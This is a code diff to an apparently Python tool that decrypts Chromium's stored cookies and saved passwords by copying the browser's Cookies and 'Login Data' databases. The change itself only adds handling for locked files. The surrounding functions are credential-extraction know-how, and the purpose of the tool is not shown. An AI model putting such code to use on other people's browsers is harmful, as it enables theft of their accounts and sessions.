@@ -745,13 +745,22 @@ def decrypt_chromium_cookies(
     temp_db = temp_dir / "Cookies"
     
     try:
-        shutil.copy2(cookies_db, temp_db)
+        try:
+            shutil.copy2(cookies_db, temp_db)
+        except (PermissionError, OSError) as e:
+            # File is locked by browser - this is common when browser is running
+            shutil.rmtree(temp_dir, ignore_errors=True)
+            errors.append(f"Cookies database locked (browser running?): {cookies_db.name}")
+            return cookies, errors
         
         # Copy WAL files
         for suffix in ["-wal", "-shm", "-journal"]:
             wal_path = cookies_db.parent / f"Cookies{suffix}"
             if wal_path.exists():
-                shutil.copy2(wal_path, temp_dir / f"Cookies{suffix}")
+                try:
+                    shutil.copy2(wal_path, temp_dir / f"Cookies{suffix}")
+                except (PermissionError, OSError):
+                    pass  # WAL files are optional
         
         conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
         # Use bytes text_factory to handle binary encrypted_value column properly
@@ -870,12 +879,21 @@ def decrypt_chromium_passwords(
     temp_db = temp_dir / "Login Data"
     
     try:
-        shutil.copy2(login_data_path, temp_db)
+        try:
+            shutil.copy2(login_data_path, temp_db)
+        except (PermissionError, OSError) as e:
+            # File is locked by browser - this is common when browser is running
+            shutil.rmtree(temp_dir, ignore_errors=True)
+            errors.append(f"Login database locked (browser running?): {login_data_path.name}")
+            return credentials, errors
         
         # Also copy WAL file if exists
         wal_path = login_data_path.parent / "Login Data-wal"
         if wal_path.exists():
-            shutil.copy2(wal_path, temp_dir / "Login Data-wal")
+            try:
+                shutil.copy2(wal_path, temp_dir / "Login Data-wal")
+            except (PermissionError, OSError):
+                pass  # WAL files are optional
         
         # Connect and extract
         conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
